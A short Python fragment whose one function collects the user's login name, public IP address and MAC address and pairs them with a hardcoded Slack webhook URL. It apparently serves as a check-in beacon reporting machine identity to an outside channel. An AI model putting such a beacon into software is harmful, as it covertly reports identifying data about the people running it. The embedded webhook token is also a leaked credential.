import os
import requests

from getmac import get_mac_address as gma


def connection():
    url = 'https://hooks.slack.com/services/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'
    msg = os.getlogin() + " / " + requests.get('https://api.ipify.org').text + " / " + gma()
    return ([url, msg])
    
